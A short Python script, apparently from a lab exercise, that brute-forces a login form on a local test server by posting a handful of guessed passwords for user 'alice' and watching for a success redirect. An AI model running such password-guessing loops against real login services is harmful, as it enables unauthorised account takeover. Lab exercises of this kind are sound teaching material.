# lab2_bruteforce/try_passwords.py
import requests

URL = "http://127.0.0.1:5080/"
username = "alice"
passwords = ["pass", "1234", "wonderland", "alice", "password"]

s = requests.Session()
for pwd in passwords:
    r = s.post(URL, data={"user": username, "password": pwd})
    # Check if redirected to /secret (login success)
    if r.history and r.history[0].status_code == 302:
        print(f"[+] Success with password: {pwd}")
        break
    else:
        print(f"[-] Failed: {pwd}")
